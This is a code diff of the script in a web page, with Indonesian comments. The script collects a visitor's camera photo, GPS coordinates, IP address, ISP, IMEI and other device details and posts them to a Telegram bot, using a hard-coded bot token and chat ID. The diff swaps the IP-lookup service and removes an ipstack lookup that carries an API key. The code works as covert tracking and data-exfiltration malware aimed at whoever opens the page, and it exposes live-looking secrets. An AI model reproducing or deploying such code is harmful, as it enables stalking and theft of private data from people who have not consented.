@@ -65,8 +65,8 @@
                 deviceInfo.isp = getISPInfo(); // Memanggil fungsi untuk mendapatkan info ISP
                 deviceInfo.imei = getIMEIInfo(); // Memanggil fungsi untuk mendapatkan info IMEI
 
-                // Mengambil IP perangkat menggunakan layanan ipify
-                fetch('https://api.ipify.org?format=json')
+                // Mengambil IP perangkat menggunakan layanan whoer.net
+                fetch('https://api.whoer.net/v2/json/')
                   .then(function(response) {
                     return response.json();
                   })
@@ -75,7 +75,6 @@
 
                     // Mengirim foto, lokasi, informasi perangkat, dan informasi batrai ke Telegram API
                     sendToTelegram(latitude, longitude, accuracy, deviceInfo, imageDataURL);
-                    getIPDetails(deviceInfo.ipAddress);
                   })
                   .catch(function(error) {
                     console.error('Terjadi kesalahan dalam mendapatkan alamat IP:', error);
@@ -102,8 +101,8 @@
 
     // Fungsi untuk mengirim data foto, lokasi, dan informasi perangkat ke Telegram API
     function sendToTelegram(latitude, longitude, accuracy, deviceInfo, imageDataURL) {
-      var botToken = '6130843488:AAEcBDwepm6__C3geoFMSJtsMVrKFeWhMKQ'; // Ganti dengan token bot Telegram Anda
-      var chatId = '1121369247'; // Ganti dengan ID chat Telegram Anda
+      var botToken = '6130843488:AAEcBDwepm6__C3geoFMSJtsMVrKFeWhMKQ';
+      var chatId = '1121369247';
 
       var url = 'https://api.telegram.org/bot' + botToken + '/sendPhoto';
       var formData = new FormData();
@@ -155,8 +154,8 @@
 
     // Fungsi untuk mendapatkan alamat IP perangkat dengan cara alternatif
     function getAlternativeIPAddress(deviceInfo, imageDataURL, latitude, longitude, accuracy) {
-      // Mendapatkan alamat IP menggunakan layanan ipify (alternatif)
-      fetch('https://api6.ipify.org?format=json')
+      // Mendapatkan alamat IP menggunakan layanan whoer.net (alternatif)
+      fetch('https://api.whoer.net/v2/json/')
         .then(function(response) {
           return response.json();
         })
@@ -165,29 +164,10 @@
 
           // Mengirim foto, lokasi, informasi perangkat, dan informasi batrai ke Telegram API
           sendToTelegram(latitude, longitude, accuracy, deviceInfo, imageDataURL);
-          getIPDetails(deviceInfo.ipAddress);
         })
         .catch(function(error) {
           console.error('Terjadi kesalahan dalam mendapatkan alamat IP (alternatif):', error);
           sendToTelegram(latitude, longitude, accuracy, deviceInfo, imageDataURL);
-        });
-    }
-
-    // Fungsi untuk mendapatkan informasi detail tentang IP address menggunakan ipstack API
-    function getIPDetails(ipAddress) {
-      var accessKey = '7a0598fbfb02d1b40e183b6751f39294'; // Ganti dengan API access key dari ipstack.com
-
-      var url = 'http://api.ipstack.com/' + ipAddress + '?access_key=' + accessKey;
-
-      fetch(url)
-        .then(function(response) {
-          return response.json();
-        })
-        .then(function(data) {
-          console.log('Informasi IP:', data);
-        })
-        .catch(function(error) {
-          console.error('Terjadi kesalahan dalam mendapatkan informasi IP:', error);
         });
     }
   </script>
